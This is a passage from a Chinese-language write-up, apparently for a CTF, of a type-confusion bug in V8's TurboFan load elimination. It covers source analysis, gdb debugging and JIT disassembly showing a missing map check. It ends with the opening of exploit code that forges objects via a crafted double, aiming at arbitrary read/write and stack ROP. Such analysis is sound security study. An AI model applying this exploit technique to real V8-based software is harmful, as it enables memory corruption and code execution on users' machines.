patch了`AliasStateInfo alias_info(state, object, source_map);`和`state =
state->KillMaps(object, zone());`，我们先来看看`KillMaps`的源码
    LoadElimination::AbstractState const* LoadElimination::AbstractState::KillMaps(
        const AliasStateInfo& alias_info, Zone* zone) const {
      if (this->maps_) {
        AbstractMaps const* that_maps = this->maps_->Kill(alias_info, zone);
        if (this->maps_ != that_maps) {
          AbstractState* that = new (zone) AbstractState(*this);
          that->maps_ = that_maps;
          return that;
        }
      }
      return this;
    }
继续看`Kill`的源码,如果有两个node指向同一个对象，则创建了新map。
    LoadElimination::AbstractElements const*
    LoadElimination::AbstractElements::Kill(Node* object, Node* index,
                                            Zone* zone) const {
      for (Element const element : this->elements_) {
        if (element.object == nullptr) continue;
        if (MayAlias(object, element.object)) { //如果有两个node指向同一个对象
          AbstractElements* that = new (zone) AbstractElements(zone);
          for (Element const element : this->elements_) {
            if (element.object == nullptr) continue;
            DCHECK_NOT_NULL(element.index);
            DCHECK_NOT_NULL(element.value);
            if (!MayAlias(object, element.object) ||
                !NodeProperties::GetType(index).Maybe(
                    NodeProperties::GetType(element.index))) {
              that->elements_[that->next_index_++] = element;
            }
          }
          that->next_index_ %= arraysize(elements_);
          return that;
        }
      }
      return this;
    }
从上面的源码来看，如果有`两个node指向的是同一个对象`，那么`state = state->KillMaps(object,
zone());`就会更新两个node的checkmap，这样后续生成JIT代码时，用不同的node去操作源对象也不会发生问题。为了进一步验证猜想，我们用gdb调试一下。  
gdb设置参数，其中—no-enable-slow-asserts是为了能够使用`p
state->Print()`来查看checkmaps的信息，否则会报错。
    set args --allow-natives-syntax ./3.js --no-enable-slow-asserts
测试代码
    function opt(a,b) { 
       a[0] = 1.1;
       b[0] = 1.1;
       a[0] = {};
       b[0] = 1.1;
    }
    var a;
    for (var i=0;i [FastProperties]
     - prototype: 0x2aa8082cb529 
     - elements: 0x2aa8083dc99d  [HOLEY_ELEMENTS]
     - length: 1
     - properties: 0x2aa8080426dd  {
        0x2aa808044649: [String] in ReadOnlySpace: #length: 0x2aa808242159  (const accessor descriptor)
     }
     - elements: 0x2aa8083dc99d  {
               0: -858993459
    pwndbg> dd 0x2aa8083dc99c
    00002aa8083dc99c     080424a5 00000022 9999999a 3ff19999
    00002aa8083dc9ac     080423a1 080423a1 080423a1 080423a1
    00002aa8083dc9bc     080423a1 080423a1 080423a1 080423a1
    00002aa8083dc9cc     080423a1 080423a1 080423a1 080423a1
可以看到，1.1这个double值被误认为是对象指针，由此可以伪造对象。
###  JIT代码分析
首先poc的前面一大部分操作都是为了生成有问题的JIT代码，`LoadElimination::ReduceTransitionElementsKind`是在编译器编译时调用的，而不是JIT代码运行时调用的。JIT编译完成后就不需要再调用这个进行转换了，因为转换的操作已经固化成汇编的形式了。如下是截取的有问题的JIT代码（关键部分）
    0x353900085199   2d9  45398528010000 cmpl [r13+0x128] (root (heap_number_map)),r8
    0x3539000851a0   2e0  0f84b1010000   jz 0x353900085357  
    0x3539000851a6   2e6  453985a8010000 cmpl [r13+0x1a8] (root (bigint_map)),r8
    0x3539000851ad   2ed  0f8492010000   jz 0x353900085345  
    0x3539000851b3   2f3  8b4f07         movl rcx,[rdi+0x7]
    0x3539000851b6   2f6  4903cd         REX.W addq rcx,r13
    0x3539000851b9   2f9  c5fb114107     vmovsd [rcx+0x7],xmm0
    0x3539000851be   2fe  488be5         REX.W movq rsp,rbp
    0x3539000851c1   301  5d             pop rbp
    0x3539000851c2   302  c22800         ret 0x28
我们再看一下在正常的v8引擎中相同部分编译的JIT代码
    0x320a00084f30    70  48b9253930080a320000 REX.W movq rcx,0x320a08303925    ;; object: 0x320a08303925 
    ................................................................
    0x320a0008519d   2dd  4539a528010000 cmpl [r13+0x128] (root (heap_number_map)),r12
    0x320a000851a4   2e4  0f84da010000   jz 0x320a00085384  
    0x320a000851aa   2ea  4539a5a8010000 cmpl [r13+0x1a8] (root (bigint_map)),r12
    0x320a000851b1   2f1  0f84ba010000   jz 0x320a00085371  
    0x320a000851b7   2f7  394fff         cmpl [rdi-0x1],rcx
    0x320a000851ba   2fa  0f858c020000   jnz 0x320a0008544c  
    0x320a000851c0   300  8b4f07         movl rcx,[rdi+0x7]
    0x320a000851c3   303  4903cd         REX.W addq rcx,r13
    0x320a000851c6   306  c5fb114107     vmovsd [rcx+0x7],xmm0
    0x320a000851cb   30b  488b4de8       REX.W movq rcx,[rbp-0x18]
    0x320a000851cf   30f  488be5         REX.W movq rsp,rbp
    0x320a000851d2   312  5d             pop rbp
    0x320a000851d3   313  4883f904       REX.W cmpq rcx,0x4
    0x320a000851d7   317  7f03           jg 0x320a000851dc  
    0x320a000851d9   319  c22800         ret 0x28
可以知道，漏洞的v8的JIT编译的代码正是因为少了这一句map类型的比较，从而导致了类型混淆。
    0x320a000851b7   2f7  394fff         cmpl [rdi-0x1],rcx
###  漏洞利用
现在的v8存在指针压缩机制(pointer
compression)，在这种机制下，指针都用4字节来表示，即将指针的基址单独仅存储一次，然后每个指针只需存后4字节即可，因为前2字节一样，这样可以节省空间。这种机制下，堆地址是可以预测的，我们可以申请一个较大的堆空间，这样它的地址在同一台机子上就很稳定基本不变（会随系统的内存以及其他一些配置变化），在不同机子上有微小变化，可以枚举爆破。  
只需要伪造一个ArrayBuffer，即可实现任意地址读写，由于本题的v8是linux下的，因此比较好利用，直接泄露栈地址然后劫持栈做ROP即可。
    function opt(a,b,f1,f2)
    {
        a[0] = 1.1;
        b[0] = 1.1;
        if (f1)
            a[0] = {};
        if (f2)
            b[0] = 1.9035980891199164e+185; //这个浮点数在内存里的表示指向了faker[1]，因此，我们可以在faker[1]处开始伪造对象
    }
    //申请一个大的Array，由于V8的compression ptr，其地址低四字节稳定
    const faker = new Array(0x10000);
    faker.fill(4.765139213524301e-270);
    var buf = new ArrayBuffer(0x10000);
    var dv = new DataView(buf);
    dv.setUint32(0,0xABCDEF78,true);
    //将一个32位整数打包位64位浮点数
    function p64(val) {
       dv.setUint32(0x8,val & 0xFFFFFFFF,true);
       dv.setUint32(0xC,val >> 32,true);
       var float_val = dv.getFloat64(0x8,true);
       return float_val;
    }
    //将两个32位整数打包为一个64位浮点数